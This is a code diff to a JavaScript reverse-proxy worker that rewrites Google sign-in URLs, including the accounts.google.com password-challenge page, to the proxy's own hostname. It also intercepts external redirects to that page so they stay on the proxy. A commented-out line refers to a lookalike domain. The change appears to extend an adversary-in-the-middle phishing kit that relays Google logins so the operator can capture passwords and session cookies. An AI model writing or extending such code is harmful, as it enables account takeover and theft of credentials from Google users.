@@ -140,6 +140,10 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                reg: /signaler-pa.googleapis.com/gi,
                replacement: this.browserEndPoint.clientContext.hostname,
            },
+           {
+               reg: /https:\/\/accounts\.google\.com\/v3\/signin\/challenge\/pwd/gi,
+               replacement: '/v3/signin/challenge/pwd',
+           },
         //    {
         //     reg: new RegExp(`https:\/\/${this.browserEndPoint.clientContext.hostname}\/CheckCookie`, 'gi'),
         //     replacement: 'https://account.fujimems.com/CheckCookie'
@@ -158,7 +162,18 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         const extRedirectObj = super.getExternalRedirect()
         if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url
-            
+           console.log('External redirect detected:', rLocation)
+           
+           // Handle redirects to password challenge form
+           if (rLocation && rLocation.includes('/v3/signin/challenge/pwd')) {
+               console.log('Redirecting to password challenge form:', rLocation)
+               // Extract the path and query from the redirect URL
+               const urlObj = new URL(rLocation)
+               const redirectPath = urlObj.pathname + urlObj.search
+               this.browserEndPoint.setHeader('Location', redirectPath)
+               this.browserEndPoint.writeHead(302)
+               return this.browserEndPoint.end()
+           }
         }
 
         if (this.proxyResp.headers['content-length'] < 1) {
